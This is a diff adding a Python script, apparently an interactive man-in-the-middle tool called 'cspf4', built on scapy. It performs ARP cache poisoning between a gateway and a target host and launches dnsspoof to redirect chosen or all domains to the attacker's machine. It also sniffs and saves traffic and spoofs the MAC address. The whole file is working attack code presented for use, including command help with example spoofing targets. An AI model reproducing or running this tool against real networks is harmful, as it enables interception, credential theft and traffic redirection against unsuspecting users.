@@ -1,0 +1,293 @@
+#!/usr/bin/python3
+from scapy.all import *
+from os import system as run
+from os import getuid as uid
+from time import sleep
+from sys import argv as args
+from colorama import Fore as color
+import netifaces
+import readline
+import random
+from time import ctime
+red=color.LIGHTRED_EX
+green=color.LIGHTGREEN_EX
+blue=color.LIGHTCYAN_EX
+yellow=color.LIGHTYELLOW_EX
+
+
+def banner():
+    print(red+"""
+     a88888b. .d88888b   888888ba   88888888b dP   dP 
+    d8'   `88 88.    "'  88    `8b  88        88   88 
+    88        `Y88888b. a88aaaa8P' a88aaaa    88aaa88 
+    88              `8b  88         88             88 
+    Y8.   .88 d8'   .8P  88         88             88 
+     Y88888P'  Y88888P   dP         dP             dP 
+     oooooooooooooooooooooooooooooooooooooooooooooooooo
+     Ultimate Mitm Framework Made By Crypt00o
+     Eslam Mohamed : https://github.com/Crypt00o""")
+
+
+class MyCompleter(object):  
+
+    def __init__(self, options):
+        self.options = sorted(options)
+
+    def complete(self, text, state):
+        if state == 0:  
+            if text:  
+                self.matches = [s for s in self.options 
+                                    if s and s.startswith(text)]
+            else:  
+                self.matches = self.options[:]
+        try: 
+            return self.matches[state]
+        except IndexError:
+            return None
+
+completer = MyCompleter(["scan", "spoof", "sniff", "newmac", "route","ip","mac","help","clear","exit"])
+readline.set_completer(completer.complete)
+readline.parse_and_bind('tab: complete')
+
+
+
+
+
+def check():
+    try :
+        inerface=args[1]
+        if_list=netifaces.interfaces()
+        if args[1] not in if_list: 
+            raise NameError
+        user_id=uid()
+        if user_id==0:
+            return
+        else:
+            print(red+"\n[-] Need to run with sudo or as root")
+    except:
+        print(red+"\n\n[-] Please Enter Available Enterface ")
+        if_list=netifaces.interfaces()
+        str_if_list="\n"
+        for i in if_list:
+           str_if_list=str_if_list+i+" "
+        str_if_list=str_if_list+"\n"
+        print(green+ str_if_list)
+        print(red+"[+]Example :"+green+" ./cspf4 wlan0")
+        exit(True)
+
+def spoof(targetip,spoofip):
+    targetmac=getmacbyip(targetip)
+    spoofpacket=ARP(op=2,pdst=targetip,hwdst=targetmac,psrc=spoofip)
+    send(spoofpacket,verbose=0)
+
+def restore(ip1,ip2):
+    ip1mac=getmacbyip(ip1)
+    ip2mac=getmacbyip(ip2)
+    restorepacket=ARP(op=2,pdst=ip1,hwdst=ip1mac,psrc=ip2,hwsrc=ip2mac)
+    send(restorepacket,verbose=False)
+
+def dnsspf(ip):
+    interface=args[1]
+    cli="dnsspoof"+" -i " +interface+" -f cryptohosts host "+ip+" and udp port 53 2>dns_log &"
+    run(cli)
+
+
+
+def restore_dns():
+    cli="rm cryptohosts && pkill dnsspoof"
+    run(cli)
+
+
+def scanner(ip):
+    print(red +"\n")
+    try:
+        arping(ip)
+    except:
+                print(red +"\n\t[!] Enter an IP Not Symbols or Letters [!] ")
+                return
+
+def config_hosts(dns):
+                if dns=="all":
+                    dns="*"
+                interface=args[1]
+                attackerip=get_if_addr(interface) 
+                print(yellow+"\n\t[+] Configing CryptoHosts [+]\n")
+                sleep(2)
+                hostsfile=open('cryptohosts','w')
+                hostsfile.write((attackerip+"\t"+dns))
+                hostsfile.close()
+                return
+
+def spoofing(ip1,ip2):
+    try:
+        packet=0
+        while True:
+            spoof(ip1,ip2)
+            spoof(ip2,ip1)
+            packet=packet+2
+            print(red+"\r\t[*]Packet Sended -> "+str(packet),end="");
+            sleep(2)
+    except KeyboardInterrupt:
+        print(green+"\n\n\t[+] Cleaning Up ...")
+        restore(ip1,ip2)
+        restore(ip2,ip1)
+        restore_dns()
+        sleep(3)
+        print(yellow+"\n\n\t[+] Finished ~__< [+]")
+    except:
+        spoofing(ip1,ip2)
+
+
+def totalspoof(ip1,ip2,dns):
+    try:
+        if (getmacbyip(ip1)==None):
+            print(red + "\n\t [-] Host "+ ip1+" is Down [-]")
+            return
+        if(getmacbyip(ip2)==None):
+            print(red + "\n\t [-] Host "+ ip2+" is Down [-] ")
+            return
+    except:
+        print(red +"\n\t[!] Enter an IP Not Symbols or Letters [!] ")
+        return
+    print(green+"\n\n\t[+] Starting Spoofing [+]\n\n")
+    config_hosts(dns)
+    dnsspf(ip2)
+    spoofing(ip1,ip2)
+
+def macchanger(newmac):
+    print(red+"[-]Old MAC -> "+get_if_hwaddr(args[1]))
+    print(green+"[+]New MAC -> "+newmac)
+    run("ifconfig "+args[1]+ " down")
+    run("ifconfig "+args[1]+ " hw ether "+newmac)
+    run("ifconfig "+args[1]+" up")
+def macchangerauto():
+    a=hex(random.randint(1,15)).split('0x')[1]
+    b=random.choice("02468ace")
+    c=hex(random.randint(1,15)).split('0x')[1]
+    d=random.choice("02468ace")
+    e=hex(random.randint(1,15)).split('0x')[1]
+    f=random.choice("02468ace")
+    g=hex(random.randint(1,15)).split('0x')[1]
+    h=random.choice("02468ace")
+    i=hex(random.randint(1,15)).split('0x')[1]
+    j=random.choice("02468ace")
+    k=hex(random.randint(1,15)).split('0x')[1]
+    l=random.choice("02468ace")
+    newmac=a+b+":"+c+d+":"+e+f+":"+g+h+":"+i+j+":"+k+l
+    oldmac=get_if_hwaddr(args[1])
+    print(red+"[-]Old MAC -> "+get_if_hwaddr(args[1]))
+    print(green+"[+]New MAC -> "+newmac)
+    run("ifconfig "+args[1]+ " down")
+    run("ifconfig "+args[1]+ " hw ether "+newmac)
+    run("ifconfig "+args[1]+" up")
+
+def filtering(li):
+    for i in li:
+        if i==' ':
+            li.remove(i)
+            filtering(li)
+
+def sniffing(numofpacket,myfilter,filename):
+    if filename==None:
+        print(yellow+"\n\n\t[+] Starting Live Sniffing [+]")
+        try:
+            if numofpacket==0:
+                sniff(iface=args[1],filter=myfilter).show()
+            else:
+                sniff(iface=args[1],count=numofpacket,filter=myfilter).show()
+        except:
+            print(red+"Use : sniff <count number> <filter>")
+        return
+    else:
+        print(yellow+"\n\n\t[+] Starting Live Sniffing [+]")
+        try:
+            
+            if numofpacket==0:                                                   
+                capture=sniff(iface=args[1],filter=myfilter)
+                capture.show()
+                wrpcap((filename+".pcap"),capture)
+
+            else:                                                                
+                capture=sniff(iface=args[1],count=numofpacket,filter=myfilter)
+                capture.show()
+                wrpcap((filename+".pcap"),capture)
+            
+        except:                                                              
+            print(red+"Use : sniff <count number> <filter>")             
+        return
+def myhelp():
+    print(yellow+"""
+    scan <ip>
+    spoof <gateway ip> <target ip> <dns to spoof>
+    example : scan 192.168.1.1
+              scan 192.168.1.1/24
+              spoof 192.168.1.1 192.168.1.125 google.com
+              spoof 192.168.1.1 192.168.1.125 all
+              sniff "to sniffing live hosts"
+              route "to show network routing information"
+              newmac xx:xx:xx:xx:xx:xx ,your custom mac
+              newmac " change mac to random mac "
+              ip "to know your ip"
+              mac "to know your mac"
+              clear
+              exit
+    Mady By Eslam Mohamed : https://github.com/Crypt00o
+    Type help to see this help
+    """)
+def selector():
+    print(blue+"\t [+] Type help to see Options [+]")
+    while True:
+        choice = input(yellow+"\ncspf4 > "+green)
+        li=choice.split(" ")
+        filtering(li)
+        if li[0]=="scan" and len(li)==2:
+            scanner(li[1])
+        elif li[0]=="spoof" and len(li)==4:
+            totalspoof(li[1],li[2],li[3])
+        elif li[0]=="help":
+            myhelp() 
+        elif li[0]=="sniff" :
+            count=input('Packet Count > ')
+            myfilter=input('Filter > ')
+            filename=input("\n[+] if you won,t save pcap ,press Enter \nSave File As > ")
+            if len(filename)==0:
+                filename=None
+            else:
+                pass
+            if len(count)==0:
+                count=0
+            else:
+                count=int(count)
+            if len(myfilter)==0:
+                myfilter=""
+            sniffing(count,myfilter,filename)
+                
+        elif li[0]=="route":
+            print(scapy.route.Route())
+        elif li[0]=="newmac" and len(li)==1 :
+            macchangerauto()
+        elif li[0]=="newmac" and len(li)==2 :
+            if len(li[1])==17 and (li[1][2]==":" and li[1][14]==":"):
+                macchanger(li[1])
+        elif li[0]=="mac":
+            print("\n[*]Current MAC -> "+get_if_hwaddr(args[1]))
+        elif li[0]=="ip":
+            print("\n[*]Current IP -> "+get_if_addr(args[1]))
+        elif li[0]=="exit":
+            exit(True)
+        elif li[0]=="scan" and len(li)!=2:
+            print(red+"\n use: scan <ip> ,type help to learn more")
+        elif li[0]=="spoof" and len(li)!=4:
+            print(red+"\n use: spoof <gateway ip> <target ip> <dns to spoof> ,type help to learn more")
+
+        elif li[0]=="clear":
+            run("clear")
+        else:
+            print(red+" [-] Invaild Choice ")
+
+check()
+try:
+    banner()
+    selector()
+except :
+  print(red+"\n\n\t[x] Exiting [x]")
